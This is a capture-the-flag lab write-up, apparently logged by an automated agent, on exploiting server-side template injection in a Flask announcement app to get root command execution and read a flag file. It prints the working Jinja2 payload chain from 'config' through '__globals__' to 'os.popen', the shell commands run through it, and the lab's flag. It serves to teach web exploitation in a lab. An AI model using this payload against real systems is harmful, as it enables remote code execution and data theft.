# SSTI via Flask render_template_string -> RCE (announce form)

## Metadata

ID: xebec-ssti1-render-template-string
Title: SSTI via Flask render_template_string -> RCE (announce form)
Source: cylabacademy.net lab instance (direct URL, no platform login required)
Type: web / server-side template injection
Tags: ssti, jinja2, flask, rce, web, cylab
Technique: ssti

## Challenge Summary

A small Flask announcement web app. The home page renders a form
(`POST /`, field `content`) and a note that announcements "may only reach
yourself". Submitting the form redirects (307) to a result page that renders
the submitted content server-side.

Goal: read the flag file stored in the app container.

## Initial Observations

- `Server: Werkzeug/<ver> Python/<ver>` -> Flask application.
- Page `<title>` literally announced the vulnerability class (`SSTI1`).
- Single text input `name="content"`, submitted by POST to the same path.
- The result page echoed the submitted value back inside an `<h1>`.
- Hint "announcements may only reach yourself" implied there was no
  third-party/admin viewer to exploit, so any exfiltration had to come back
  to the attacker directly (server-side output), not through a bot.

## Acknowledgement

- Source: user-controlled POST field `content`.
- Sink: server-side template rendering of that value.
- Hypothesis: Jinja2 Server-Side Template Injection (SSTI), escalating to RCE.

## Hypothesis

1. `{{7*7}}` renders `49` -> SSTI confirmed, expression evaluation works.
2. Jinja `config` object is exposed -> walk `__class__` -> `__init__` ->
   `__globals__` -> `os` -> `popen()` -> command output rendered back.
3. Flag lives in a file inside the container; locate it with `find`, then `cat`.

## Attempts

### Attempt 1 - Confirm SSTI

Action: POST `content={{7*7}}`
Result: redirect to result page, rendered `<h1>` contained `49`.
Analysis: Template expressions are evaluated -> SSTI confirmed.

### Attempt 2 - Escalate to RCE

Action: POST
`content={{config.__class__.__init__.__globals__['os'].popen('id').read()}}`
Result: `uid=0(root) gid=0(root) groups=0(root)`
Analysis: Full command execution as root; output rendered inline, no filtering
observed and no characters blocked in this lab.

### Attempt 3 - Locate the flag

Action: run `ls -la /` plus `find / -maxdepth 4 -iname '*flag*'`.
Result: single hit `/challenge/flag`.
Analysis: A single well-known flag path; reading it directly is cheaper than
enumerating the app directory first.

### Attempt 4 - Read and verify the flag

Action: `ls -la /challenge/; cat /challenge/flag`
Result: `app.py`, `requirements.txt`, `__pycache__` and the flag file
(58 bytes).
Analysis: Flag retrieved.

### Attempt 5 - Independent verification

Action: `md5sum`, `wc -c`, and `od -c` of the flag file.
Result: 58 bytes, `academy{...}` wrapper, no trailing whitespace, byte-exact.
Analysis: Confirms the earlier read was the complete real file content and
not a truncated or partially-rendered string.

### Attempt 6 - Understand the challenge (source review)

Action: `cat /challenge/app.py`.
Result: the app uses `render_template_string()` on a template built with
string concatenation of `request.form.get("content")` - the classic unsafe
Flask pattern, and the exact reason the injection works.
Analysis: Confirms the sink and that no extra step remained to finish the lab.

## Successful Approach

1. Recon the form, note the vulnerable field.
2. Probe with `{{7*7}}` to confirm template evaluation.
3. Escalate with the `config -> __init__ -> __globals__ -> os -> popen`
   chain to get command execution.
4. Use the shell inside the template to find and read the flag file.
5. Re-read the flag with `md5sum`/`od -c` to prove the output was complete.

## Tools Used

- `http_fetch` (existing) - initial recon of the home page and headers.
- `ssti_probe` (existing) - every injection step; it handled the
  `POST -> 307 redirect -> follow to result page` pattern automatically.
- No new tool script was created: the two existing tools covered the whole
  attack, so nothing needed to be written or kept.

## Final Result

Flag obtained: `academy{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_5f46e534}`

## Failed Approaches

None that were abandoned. One minor dead end: reading `app.py` and
`requirements.txt` in a single command returned HTTP 500 because the dumped
source contained HTML/template markup that broke the surrounding render;
splitting the command into a single `cat` fixed it. Lesson: when output
carries raw markup, isolate commands rather than concatenating them.

## Lessons Learned

- A redirect-based flow (POST then `303/307` to a result page) is not an
  obstacle - handle the redirect and read the final page, because that final
  page is where the injection output appears.
- Multi-line command output inside a single template expression can be
  fragile; run one command per request when output may contain markup.
- Verifying a flag with `md5sum`/`wc -c`/`od -c` is cheap and proves the read
  was whole - worth doing before declaring success.

## Reusable Knowledge

See `knowledge/ssti.md` for the Jinja2 SSTI detection methodology, sinks,
payload chain, and escalation techniques.
